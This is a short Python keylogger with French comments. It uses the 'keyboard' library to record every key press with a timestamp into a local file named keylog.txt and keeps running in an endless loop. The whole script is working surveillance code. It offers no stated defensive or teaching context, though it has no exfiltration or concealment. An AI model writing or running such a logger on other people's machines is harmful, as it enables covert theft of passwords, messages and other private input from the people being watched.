import keyboard
import datetime

def on_key_press(event):
    # Enregistre la frappe de clavier avec l'horodatage actuel
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    key_pressed = event.name
    with open('keylog.txt', 'a') as f:
        f.write(f'{timestamp}: {key_pressed}\n')

# Écoute les événements de frappe de clavier
keyboard.on_press(on_key_press)

# Boucle infinie pour maintenir le programme en cours d'exécution
while True:
    pass
